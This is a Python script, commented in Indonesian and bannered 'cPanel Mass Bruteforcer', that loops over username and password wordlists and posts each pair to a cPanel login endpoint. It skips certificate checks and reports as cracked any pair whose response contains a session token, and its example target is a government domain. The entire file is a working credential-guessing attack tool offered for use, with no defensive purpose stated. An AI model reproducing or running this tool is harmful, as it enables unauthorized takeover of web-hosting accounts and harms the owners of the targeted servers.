import requests
import urllib3
from colorama import Fore, Style, init

# Inisialisasi Colorama untuk memberikan warna pada output terminal
init(autoreset=True)

# Menonaktifkan peringatan yang muncul karena sertifikat SSL yang tidak diverifikasi
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def brute_force_cpanel(host, username_list, password_list):
    successful_logins = []
    failed_logins = []

    # Melakukan iterasi atas setiap kombinasi username dan password
    for username in username_list:
        for password in password_list:
            password = password.strip()  # Menghapus spasi berlebih di password
            try:
                # Mengatur endpoint dan data untuk request POST
                url = f"{host}/login/?login_only=1"
                data = {'user': username, 'pass': password}

                # Melakukan request POST ke server
                response = requests.post(url, data=data, verify=False)

                # Memeriksa apakah login berhasil dengan mencari kata 'cpsess' di respons
                if "cpsess" in response.text:
                    successful_logins.append(f"Username: {username} | Password: {password}")
                    #print(f"{Fore.GREEN}Username: {username} | Password: {password}")
                else:
                    failed_logins.append(f"Username: {username} | Password: {password}")
                    print(f"{Fore.RED}Username: {username} | Password: {password} -> NO")
            except requests.RequestException as e:
                print(f"{Fore.RED}Could not connect to {host}: {str(e)}")

    return successful_logins, failed_logins

# Titik awal eksekusi skrip
if __name__ == "__main__":
    print(f"""
        ___                 _ _   {Fore.YELLOW}@wongalus7{Fore.RESET}    __    
  ___  / _ \__ _ _ __   ___| | |__   ___  _   _/ _\   
 / __|/ /_)/ _` | '_ \ / _ \ | '_ \ / _ \| | | \ \    
| (__/ ___/ (_| | | | |  __/ | |_) | (_) | |_| |\ \   
 \___\/    \__,_|_| |_|\___|_|_.__/ \___/ \__, \__/   
{Fore.YELLOW}cPanel Mass Bruteforcer{Fore.RESET}                   |___/       
    """)
    host = input("Host (contoh: https://piranha.go.id:2083): ")
    mode = input("Username (1. Single Username | 2. Mass Username): ")

    # Memilih mode berdasarkan input pengguna
    if mode == '1':
        username = input("Single username (dari /home/user/): ")
        username_list = [username]  # Menggunakan single username
    elif mode == '2':
        username_file = input("Username list (contoh: username.txt): ")
        with open(username_file, 'r') as uf:
            username_list = uf.read().splitlines()
    else:
        print(f"{Fore.RED}Gwoblok!")
        exit()

    password_file = input("Password list (contoh: password.txt): ")
    with open(password_file, 'r') as pf:
        password_list = pf.read().splitlines()

    # Memanggil fungsi brute-force dan menampilkan hasilnya
    successful_logins, failed_logins = brute_force_cpanel(host, username_list, password_list)

    if successful_logins:
        for login in successful_logins:
            print(f"{Fore.GREEN}{login} -> OK")
    else:
        print(f"\n{Fore.RED}Gada yang berhasil login satupun. password list nya jelek mungkin.")
